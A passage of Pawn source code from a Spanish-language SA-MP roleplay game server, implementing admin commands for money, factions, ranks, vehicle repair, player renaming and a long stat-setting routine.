	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/givemoney", true) == 0) //Dar dinero
{
    if(PlayerInfo[playerid][pAdmin] < 4){ SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1; }
    tmp = strtok(cmdtext, idx);
   	if(!strlen(tmp))
    {
	    SendClientMessage(playerid, Naranja, "* /Givemoney [ID] [Cantidad]");
	    return 1;
	}
    playerid2 = ReturnUser(tmp);
    if(IsPlayerConnected(playerid2) && playerid2 != INVALID_PLAYER_ID)
    {
        tmp = strtok(cmdtext, idx);
    	if(!IsNumeric(tmp) || !strlen(tmp))
    	{
	        SendClientMessage(playerid, Naranja, "* /Givemoney [ID] [Cantidad]");
			return 1;
	    }
        new Dinero = strval(tmp);
		GivePlayerMoneyAC(playerid2,Dinero);
		format(Nombre, sizeof(Nombre),"%s", GetPlayerNameRP(playerid));
		format(Nombre2, sizeof(Nombre2),"%s", GetPlayerNameRP(playerid2));
		format(string,sizeof(string),"'%s' te ha dado %d$ de dinero.", Nombre, Dinero);
		SendClientMessage(playerid2,AzulClaro,string);
		format(string,sizeof(string),"Has has dado a '%s' %d$ de dinero.", Nombre2, Dinero);
		SendClientMessage(playerid,AzulClaro,string);
		format(string,sizeof(string),"'%s' ha dado a '%s' %d$ de dinero.", Nombre, Nombre2, Dinero);
		SendAdminMessage(Aguamarina,string);
		printf(string);
	}
	else
	{
        SendClientMessage(playerid,Rojo,"* ID inválida.");
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/hacerlider", true) == 0) //Hacer a un jugador líder de una facción
{
    tmp = strtok(cmdtext, idx);
    if(PlayerInfo[playerid][pAdmin] < 3){ SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1; }
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Hacerlider [ID] [Facción (0-36)]");
		return 1;
	}
	playerid2 = ReturnUser(tmp);
	new lider;
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Hacerlider [ID] [Facción (0-36)]");
		return 1;
	}
	lider = strval(tmp);
	if(lider > 36 || lider < 1) { SendClientMessage(playerid, Rojo, "* La facción debe estar entre 1 y 36."); return 1; }
    if(IsPlayerConnected(playerid2) && playerid2 != INVALID_PLAYER_ID)
	{
        if(PlayerInfo[playerid2][pLider] > 0)
		{
			SendClientMessage(playerid, Rojo, "* No puedes hacer líder a un jugador que ya es líder de una facción.");
			return 1;
		}
		if(PlayerInfo[playerid2][pFaccion] > 0)
		{
			SendClientMessage(playerid, Rojo, "* No puedes hacer líder a un jugador que ya es miembro de una facción.");
			return 1;
		}
		PlayerInfo[playerid2][pLider] = lider;
		PlayerInfo[playerid2][pFaccion] = lider;
		PlayerInfo[playerid2][pRango] = 1;
		if(lider == 0){PlayerInfo[playerid2][pRango] = 0;}
		format(string, sizeof(string), "'%s' te ha hecho líder de la facción número %d.", GetPlayerNameRP(playerid), lider);
		SendClientMessage(playerid2, AzulClaro, string);
		format(string, sizeof(string), "Has hecho a '%s' líder de la facción número %d.", GetPlayerNameRP(playerid2), lider);
		SendClientMessage(playerid, AzulClaro, string);
	}
	else
	{
        SendClientMessage(playerid,Rojo,"* ID inválida.");
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/hacermiembro", true) == 0) //Hacer a un jugador miembro de una facción
{
    tmp = strtok(cmdtext, idx);
    if(PlayerInfo[playerid][pAdmin] < 3){ SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1; }
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Hacermiembro [ID] [Facción (1-36)] [Rango]");
		return 1;
	}
	playerid2 = ReturnUser(tmp);
	new faccion, rango;
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Hacermiembro [ID] [Facción (1-36)] [Rango]");
		return 1;
	}
	faccion = strval(tmp);
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Hacermiembro [ID] [Facción (1-36)] [Rango]");
		return 1;
	}
	rango = strval(tmp);
	if(faccion > 36 || faccion < 1) { SendClientMessage(playerid, Rojo, "* La facción debe estar entre 1 y 36."); return 1; }
	if(rango > 8 || rango < 1) { SendClientMessage(playerid, Rojo, "* El rango debe estar entre 1 y 8."); return 1; }
    if(IsPlayerConnected(playerid2) && playerid2 != INVALID_PLAYER_ID)
	{
		if(PlayerInfo[playerid2][pLider] > 0)
		{
			SendClientMessage(playerid, Rojo, "* No puedes hacer miembro a un jugador que ya es líder de una facción.");
            return 1;
		}
		PlayerInfo[playerid2][pFaccion] = faccion;
		PlayerInfo[playerid2][pRango] = rango;
		format(string, sizeof(string), "'%s' te ha hecho miembro de la facción número %d con rango %d.", GetPlayerNameRP(playerid), faccion, rango);
		SendClientMessage(playerid2, AzulClaro, string);
		format(string, sizeof(string), "Has hecho a '%s' miembro de la facción número %d con rango %d.", GetPlayerNameRP(playerid2), faccion, rango);
		SendClientMessage(playerid, AzulClaro, string);
	}
	else
	{
        SendClientMessage(playerid,Rojo,"* ID inválida.");
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/darrango", true) == 0) //Dar rango de facción a un jugador
{
    tmp = strtok(cmdtext, idx);
    if(PlayerInfo[playerid][pAdmin] < 3){ SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1; }
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Darrango [ID] [Rango]");
		return 1;
	}
	playerid2 = ReturnUser(tmp);
	new rango;
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Darrango [ID] [Rango]");
		return 1;
	}
	rango = strval(tmp);
	if(rango > 8 || rango < 1) { SendClientMessage(playerid, Rojo, "* El rango debe estar entre 1 y 8."); return 1; }
    if(IsPlayerConnected(playerid2) && playerid2 != INVALID_PLAYER_ID)
	{
        if(PlayerInfo[playerid2][pLider] > 0)
		{
			SendClientMessage(playerid, Rojo, "* No puedes modificar el rango de un jugador que es líder de facción, que se lo cambie él.");
			return 1;
		}
		if(PlayerInfo[playerid2][pFaccion] < 1)
		{
			SendClientMessage(playerid, Rojo, "* Este jugador no forma parte de ninguna facción.");
			return 1;
		}
		PlayerInfo[playerid2][pRango] = rango;
		format(string, sizeof(string), "'%s' te ha dado rango %d de tu facción.", GetPlayerNameRP(playerid), rango);
		SendClientMessage(playerid2, AzulClaro, string);
		format(string, sizeof(string), "Has dado a '%s' rango %d de su facción.", GetPlayerNameRP(playerid2), rango);
		SendClientMessage(playerid, AzulClaro, string);
	}
	else
	{
        SendClientMessage(playerid,Rojo,"* ID inválida.");
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/forzarfaccion", true) == 0) //Dar líder, miembro y rango 0 a un jugador
{
    tmp = strtok(cmdtext, idx);
    if(PlayerInfo[playerid][pAdmin] < 3){ SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1; }
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Forzarfaccion [ID]");
		return 1;
	}
	playerid2 = ReturnUser(tmp);
    if(IsPlayerConnected(playerid2) && playerid2 != INVALID_PLAYER_ID)
	{
        PlayerInfo[playerid2][pFaccion] = 0;
		PlayerInfo[playerid2][pRango] = 0;
		PlayerInfo[playerid2][pLider] = 0;
		PlayerInfo[playerid2][pServicioPD] = 0;
		format(string, sizeof(string), "'%s' ha forzado tu facción, rango y líder a 0.", GetPlayerNameRP(playerid));
		SendClientMessage(playerid2, AzulClaro, string);
		format(string, sizeof(string), "Has forzado la facción, rango y líder de '%s' a 0.", GetPlayerNameRP(playerid2));
		SendClientMessage(playerid, AzulClaro, string);
	}
	else
	{
        SendClientMessage(playerid,Rojo,"* ID inválida.");
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/fixveh", true) == 0) //Repara un vehículo
{
    if(PlayerInfo[playerid][pAdmin] < 2){ SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1; }
    tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Fixveh [ID]");
		return 1;
	}
	playerid2 = ReturnUser(tmp);
    if(!IsPlayerConnected(playerid2) || playerid2 == INVALID_PLAYER_ID){SendClientMessage(playerid, Rojo, "* ID inválida"); return 1;}
    if(IsPlayerInAnyVehicle(playerid2) && GetPlayerVehicleSeat(playerid2) == 0)
    {
		new coche = GetPlayerVehicleID(playerid2);
		RepairVehicle(coche);
		format(string, sizeof(string), "'%s' ha reparado el vehículo %d a '%s'.", GetPlayerNameRP(playerid), coche, GetPlayerNameRP(playerid2));
		SendAdminMessage(Aguamarina, string);
		SendClientMessage(playerid2, AzulClaro, string);
		printf("%s", string);
	}
	else
	{
        SendClientMessage(playerid,Rojo,"* Ese jugador no está en un vehículo como conductor.");
	}
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/respawncoche", true) == 0 || strcmp(cmd, "/rc", true) == 0) //Respawnea un vehículo
{
    if(PlayerInfo[playerid][pAdmin] < 2){ SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1; }
    if(IsPlayerInAnyVehicle(playerid) && GetPlayerVehicleSeat(playerid) == 0)
    {
		new coche = GetPlayerVehicleID(playerid);
		SetVehicleToRespawn(coche);
		SendClientMessage(playerid, AzulClaro, "Vehículo respawneado.");
		format(string, sizeof(string), "'%s' ha respawneado el vehículo %d.", GetPlayerNameRP(playerid), coche);
		SendAdminMessage(Aguamarina, string);
		printf("%s", string);
	}
	else
	{
        SendClientMessage(playerid,Rojo,"* No estás en un vehículo como conductor.");
	}
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/repararveh", true) == 0) //Repara la carrocería de un vehículo
{
    if(PlayerInfo[playerid][pAdmin] < 2){ SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1; }
    if(IsPlayerInAnyVehicle(playerid) && GetPlayerVehicleSeat(playerid) == 0)
    {
		new coche = GetPlayerVehicleID(playerid), Float:vida;
		GetVehicleHealth(coche, vida);
		RepairVehicle(coche);
		SetVehicleHealth(coche, vida);
		SendClientMessage(playerid, AzulClaro, "Carrocería del vehículo reparada.");
		format(string, sizeof(string), "'%s' ha reparado la carrocería del vehículo %d.", GetPlayerNameRP(playerid), coche);
		SendAdminMessage(Aguamarina, string);
		printf("%s", string);
	}
	else
	{
        SendClientMessage(playerid,Rojo,"* No estás en un vehículo como conductor.");
	}
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/repararmotor", true) == 0) //Repara el motor de un vehículo
{
    if(PlayerInfo[playerid][pAdmin] < 2){ SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1; }
    if(IsPlayerInAnyVehicle(playerid) && GetPlayerVehicleSeat(playerid) == 0)
    {
		new coche = GetPlayerVehicleID(playerid);
		SetVehicleHealth(coche, 1000);
		SendClientMessage(playerid, AzulClaro, "Motoría del vehículo reparado.");
		format(string, sizeof(string), "'%s' ha reparado el motor del vehículo %d.", GetPlayerNameRP(playerid), coche);
		SendAdminMessage(Aguamarina, string);
		printf("%s", string);
	}
	else
	{
        SendClientMessage(playerid,Rojo,"* No estás en un vehículo como conductor.");
	}
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/darpuntorol", true) == 0) //Dar un punto de rol
{
    tmp = strtok(cmdtext, idx);
    if(PlayerInfo[playerid][pAdmin] < 3){ SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1; }
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Darpuntorol [ID]");
		return 1;
	}
	playerid2 = ReturnUser(tmp);
    if(IsPlayerConnected(playerid2) && playerid2 != INVALID_PLAYER_ID)
	{
        PlayerInfo[playerid2][pPuntosRol] ++;
		format(string, sizeof(string), "'%s' te ha dado un punto de rol, enhorabuena.", GetPlayerNameRP(playerid));
		SendClientMessage(playerid2, Verde, string);
		format(string, sizeof(string), "Has dado un punto de rol a '%s'.", GetPlayerNameRP(playerid2));
		SendClientMessage(playerid, AzulClaro, string);
		format(string, sizeof(string), "'%s' ha dado un punto de rol a '%s'.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2));
		SendAdminMessage(Aguamarina, string);
		printf("%s", string);
	}
	else
	{
        SendClientMessage(playerid,Rojo,"* ID inválida.");
	}
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/quitarpuntorol", true) == 0) //Quitar un punto de rol
{
    tmp = strtok(cmdtext, idx);
    if(PlayerInfo[playerid][pAdmin] < 3){ SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1; }
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Quitarpuntorol [ID]");
		return 1;
	}
	playerid2 = ReturnUser(tmp);
    if(IsPlayerConnected(playerid2) && playerid2 != INVALID_PLAYER_ID)
	{
        PlayerInfo[playerid2][pPuntosRol] --;
		format(string, sizeof(string), "'%s' te ha quitado un punto de rol, algo habrás hecho.", GetPlayerNameRP(playerid));
		SendClientMessage(playerid2, Rojo, string);
		format(string, sizeof(string), "Has quitado un punto de rol a '%s'.", GetPlayerNameRP(playerid2));
		SendClientMessage(playerid, AzulClaro, string);
		format(string, sizeof(string), "'%s' ha quitado un punto de rol a '%s'.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2));
		SendAdminMessage(Aguamarina, string);
		printf("%s", string);
	}
	else
	{
        SendClientMessage(playerid,Rojo,"* ID inválida.");
	}
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/rotz", true) == 0) //Desvuelca un vehículo
{
	if(PlayerInfo[playerid][pAdmin] < 1){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
	if(!IsPlayerInAnyVehicle(playerid)){SendClientMessage(playerid, Rojo, "* No estás en un vehículo."); return 1;}
	new carid = GetPlayerVehicleID(playerid);
	new Float:RotZ;
	GetVehicleZAngle(carid, RotZ);
	SetVehicleZAngle(carid, RotZ + 30);
	format(string, sizeof(string), "'%s' ha usado el comando '/RotZ' en el vehículo %d.", GetPlayerNameRP(playerid), GetPlayerVehicleID(playerid));
	SendAdminMessage(Aguamarina, string);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/darmision", true) == 0) //Asigna una misión a un jugador
{
	if(PlayerInfo[playerid][pAdmin] < 4){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /DarMision [ID] [Tipo]");
		return 1;
	}
	playerid2 = ReturnUser(tmp);
	if(FaccInfo[PlayerInfo[playerid2][pFaccion]][fTipo] != 3){SendClientMessage(playerid, Rojo, "* Ese jugador no es un pandillero."); return 1;}
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /DarMision [ID] [Tipo]");
		return 1;
	}
	new tipo = strval(tmp);
	if(tipo < 1 || tipo > 3){SendClientMessage(playerid, Rojo, "* El tipo de misión debe estar entre el 1 y el 3."); return 1;}
	DarMisionPandilla(playerid2, tipo);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/cambiarnombre", true) == 0) //Cambia el nombre de un jugador
{
    if(PlayerInfo[playerid][pAdmin] < 4){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /CambiarNombre [ID] [Nombre]");
		return 1;
	}
	playerid2 = ReturnUser(tmp);
	
	new length = strlen(cmdtext);
    while ((idx < length) && (cmdtext[idx] <= ' '))
    {
        idx++;
    }
    new offset = idx;
    new result[MAX_PLAYER_NAME];
    while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
    {
        result[idx - offset] = cmdtext[idx];
        idx++;
    }
    result[idx - offset] = EOS;
    if(!strlen(result))
    {
        SendClientMessage(playerid, Naranja, "* /CambiarNombre [ID] [Nombre]");
        SendClientMessage(playerid, Naranja, "Nota: Solo puedes usar letras.");
        return 1;
    }
    if(SetPlayerName(playerid2, (result)) == -1)
	{
	    SendClientMessage(playerid, Rojo, "* No puedes darle ese nombre a ese usuario.");
	    return 1;
	}
	new nombre[MAX_PLAYER_NAME];
	GetPlayerName(playerid2, nombre, sizeof(nombre));
	format(string, sizeof(string), "'%s' ha cambiado del nombre del ID '%d' a '%s'.", GetPlayerNameRP(playerid), playerid2, (result));
	SendAdminMessage(Aguamarina, string);
	SendClientMessage(playerid2, AzulClaro, string);
	
	new query[170];
	format(query, sizeof(query), "UPDATE usuarios SET Nombre = '%s' WHERE Nombre = '%s'", (result), PlayerInfo[playerid2][pNombre]);
	mysql_query(1, query);
	
	SetPlayerName(playerid2, (result));
    format(PlayerInfo[playerid2][pNombre], sizeof((result)), (result));
	PlayerSave(playerid2);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/setstat", true) == 0) //Modificar los parámetros de un jugador
{
    if(PlayerInfo[playerid][pAdmin] < 4){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Setstat [ID] [Variable] [Cantidad]");
		return 1;
	}
	playerid2 = ReturnUser(tmp);
	
    new opcion[128];
	opcion = strtok(cmdtext, idx);
	if(!strlen(opcion))
	{
		SendClientMessage(playerid, Naranja, "* /Setstat [ID] [Variable] [Cantidad]");
		SendClientMessage(playerid, Amarillo, "Edad, Sexo, Nivel, Exp, Telefono, Trabajo, Contrato, EsperaTrabajar");
		SendClientMessage(playerid, NaranjaOscuro, "DineroBanco, Encarcelado, TiempoCarcel, Advertencias, HabPistola, HabSD");
		SendClientMessage(playerid, Amarillo, "HabDEagle, HabEscopeta, HabSawnoff, HabEscopetaCom, HabUZI");
		SendClientMessage(playerid, NaranjaOscuro, "HabMP5, HabAK47, HabM4, HabFranco, ServicioPD");
		SendClientMessage(playerid, Amarillo, "LlaveCoche[0-4], LlaveCochePrestado[0-4]");
		SendClientMessage(playerid, NaranjaOscuro, "MinPayDay, LicConduccion, LicNavegacion, LicAviacion, LicArmas, LicPesca, LicCaza");
		SendClientMessage(playerid, Amarillo, "Casa, CasaAlq, Negocio, Taller, HabMec, HabLad, TiempoRobo");
		SendClientMessage(playerid, NaranjaOscuro, "Hambre, Sed, Adiccion[0-4], DrConsumida[0-4], Fuerza, CansancioEntrenar");
		return 1;
	}
	
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Setstat [ID] [Variable] [Cantidad]");
		return 1;
	}
	new cantidad = strval(tmp);

	if(strcmp(opcion,"Edad",true) == 0)
	{
	    PlayerInfo[playerid2][pEdad] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'Edad' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"Sexo",true) == 0)
	{
	    PlayerInfo[playerid2][pSexo] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'Sexo' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"Nivel",true) == 0)
	{
	    PlayerInfo[playerid2][pNivel] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'Nivel' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"Exp",true) == 0)
	{
	    PlayerInfo[playerid2][pExp] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'Exp' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"Telefono",true) == 0)
	{
	    PlayerInfo[playerid2][pTelefono] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'Telefono' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"Trabajo",true) == 0)
	{
	    PlayerInfo[playerid2][pTrabajo] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'Trabajo' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"Contrato",true) == 0)
	{
	    PlayerInfo[playerid2][pContrato] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'Contrato' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"EsperaTrabajar",true) == 0)
	{
	    PlayerInfo[playerid2][pEsperaTrabajar] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'EsperaTrabajar' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"DineroBanco",true) == 0)
	{
	    PlayerInfo[playerid2][pDineroBanco] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'DineroBanco' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"Encarcelado",true) == 0)
	{
	    PlayerInfo[playerid2][pEncarcelado] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'Encarcelado' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"TiempoCarcel",true) == 0)
	{
	    PlayerInfo[playerid2][pTiempoCarcel] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'TiempoCarcel' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"Advertencias",true) == 0)
	{
	    PlayerInfo[playerid2][pAdvertencias] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'Advertencias' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"HabPistola",true) == 0)
	{
	    PlayerInfo[playerid2][pHabPistola] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'HabPistola' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	    SetPlayerSkillLevel(playerid2, WEAPONSKILL_PISTOL, cantidad);
	}
	else if(strcmp(opcion,"HabSD",true) == 0)
	{
	    PlayerInfo[playerid2][pHabSD] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'HabSD' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	    SetPlayerSkillLevel(playerid2, WEAPONSKILL_PISTOL_SILENCED, cantidad);
	}
	else if(strcmp(opcion,"HabDEagle",true) == 0)
	{
	    PlayerInfo[playerid2][pHabDEagle] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'HabDEagle' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	    SetPlayerSkillLevel(playerid2, WEAPONSKILL_DESERT_EAGLE, cantidad);
	}
	else if(strcmp(opcion,"HabEscopeta",true) == 0)
	{
	    PlayerInfo[playerid2][pHabEscopeta] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'HabEscopeta' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	    SetPlayerSkillLevel(playerid2, WEAPONSKILL_SHOTGUN, cantidad);
	}
	else if(strcmp(opcion,"HabSawnoff",true) == 0)
	{
	    PlayerInfo[playerid2][pHabSawnoff] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'HabSawnoff' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	    SetPlayerSkillLevel(playerid2, WEAPONSKILL_SAWNOFF_SHOTGUN, cantidad);
	}
	else if(strcmp(opcion,"HabEscopetaCom",true) == 0)
	{
	    PlayerInfo[playerid2][pHabEscopetaCom] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'HabEscopetaCom' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	    SetPlayerSkillLevel(playerid2, WEAPONSKILL_SPAS12_SHOTGUN, cantidad);
	}
	else if(strcmp(opcion,"HabUZI",true) == 0)
	{
	    PlayerInfo[playerid2][pHabUZI] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'HabUZI' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	    SetPlayerSkillLevel(playerid2, WEAPONSKILL_MICRO_UZI, cantidad);
	}
	else if(strcmp(opcion,"HabMP5",true) == 0)
	{
	    PlayerInfo[playerid2][pHabMP5] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'HabMP5' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	    SetPlayerSkillLevel(playerid2, WEAPONSKILL_MP5, cantidad);
	}
	else if(strcmp(opcion,"HabAK47",true) == 0)
	{
	    PlayerInfo[playerid2][pHabAK47] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'HabAK47' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	    SetPlayerSkillLevel(playerid2, WEAPONSKILL_AK47, cantidad);
	}
	else if(strcmp(opcion,"HabM4",true) == 0)
	{
	    PlayerInfo[playerid2][pHabM4] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'HabM4' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	    SetPlayerSkillLevel(playerid2, WEAPONSKILL_M4, cantidad);
	}
	else if(strcmp(opcion,"HabFranco",true) == 0)
	{
	    PlayerInfo[playerid2][pHabFranco] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'HabFranco' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	    SetPlayerSkillLevel(playerid2, WEAPONSKILL_SNIPERRIFLE, cantidad);
	}
	else if(strcmp(opcion,"ServicioPD",true) == 0)
	{
	    PlayerInfo[playerid2][pServicioPD] = cantidad;
	    format(string, sizeof(string), "* '%s' ha seteado 'ServicioPD' a '%s' a %d.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), cantidad);
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid2, AzulClaro, string);
	    printf(string);
	}
	else if(strcmp(opcion,"LlaveCoche0",true) == 0)
	{
	    PlayerInfo[playerid2][pLlaveCoche][0] = cantidad;
